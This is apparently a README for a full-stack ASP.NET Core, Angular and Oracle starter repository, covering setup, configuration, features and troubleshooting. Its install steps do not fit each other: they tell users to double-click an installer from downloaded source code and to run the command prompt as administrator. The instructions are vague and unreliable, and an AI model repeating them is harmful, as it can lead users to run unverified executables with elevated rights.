# 📊 aspnet-core-angular-oracle-fullstack-api - Build full web applications with ease

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/eldy7252/aspnet-core-angular-oracle-fullstack-api)

This software provides a complete foundation for web developers. It combines a powerful backend system with a modern user interface. You can manage data using Oracle databases and secure your application with standard authentication protocols.

## 📋 System Requirements

To run this application, ensure your computer meets these specifications:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Intel Core i5 or equivalent.
*   Memory: 8 GB RAM.
*   Storage: 500 MB of free disk space.
*   Network: Stable internet connection.
*   Database: Oracle Database 19c or higher.

Ensure you have the latest version of the .NET 8 Runtime installed on your machine. You can find this on the official Microsoft website.

## 🚀 How to Install

Follow these steps to set up the software on your Windows computer.

1. Visit the repository page to download the source code: [Download Application](https://github.com/eldy7252/aspnet-core-angular-oracle-fullstack-api)
2. Locate the folder where the file saved on your computer.
3. Right-click the folder and select Extract All.
4. Open the extracted folder to view the project files.
5. Search for the setup file within the main directory.
6. Double-click the installer and follow the instructions on your screen.

## ⚙️ Configuration Steps

The application requires a connection to your Oracle database. Update the configuration settings before you launch the program.

1. Open the file named appsettings.json using a basic text editor like Notepad.
2. Find the section labeled ConnectionStrings.
3. Replace the default values with your specific database username, password, and host address.
4. Save the file.
5. Close the text editor.

You must run the database scripts provided in the sql folder. Use your database management tool to execute these scripts. This creates the necessary tables for the application to function correctly.

## 🖥️ Launching the Application

Once you finish the configuration, you can start the application.

1. Open the command prompt on your Windows machine.
2. Navigate to the folder containing the project files by typing cd followed by the path to the folder.
3. Type the start command provided in the documentation file.
4. Wait for the terminal to display a message stating the server is running.
5. Open your web browser.
6. Type localhost followed by the port number displayed in your command prompt.

## 🔍 Understanding Features

This application includes tools to manage user accounts and data.

*   JSON Web Tokens: The system secures your data by verifying each user request with a unique token. This prevents unauthorized access to your account information.
*   Angular Material: The interface uses a design system that makes pages load quickly and look consistent. 
*   Responsive Design: The application adjusts its layout based on your screen size, allowing you to use it on tablets or monitors.
*   Swagger Interface: You can view the technical documentation for the backend system by navigating to the swagger endpoint in your browser. This displays all available commands and data structures.
*   Data Validation: The software checks the information you input before saving it to the database. This prevents errors and keeps your records accurate.

## 🛠️ Troubleshooting Common Problems

If you encounter issues, review these common solutions:

*   Port conflicts: If the application fails to start, another program might use the same port. Change the port number in the configuration file if necessary.
*   Database connection errors: Verify that your Oracle database is reachable. Check your username and password in the configuration file for typos.
*   Missing dependencies: If the application crashes, verify that you installed the .NET 8 Runtime correctly.
*   Browser settings: Ensure you allow pop-ups for the local address if the interface fails to display.
*   Permissions: Run your command prompt as an administrator to ensure the application has the rights to communicate with the network.

## 🛡️ Data Security

Protect your personal information by keeping your database credentials secret. Do not share the appsettings.json file with unauthorized users. If you deploy this application to a public server, change all default passwords and implement strong encryption. Regularly update the software to benefit from current security patches and performance improvements.

## 📈 Database Management

Proper maintenance keeps your application running well over time.

1. Back up your database files weekly.
2. Monitor the size of your logs to ensure the system does not run out of space.
3. Clear temporary data to improve processing speed.

This setup supports large data volumes and maintains high speed when performing searches. Use the provided Angular components to build new pages as your requirements expand. The modular structure allows you to add features without changing the core backend code.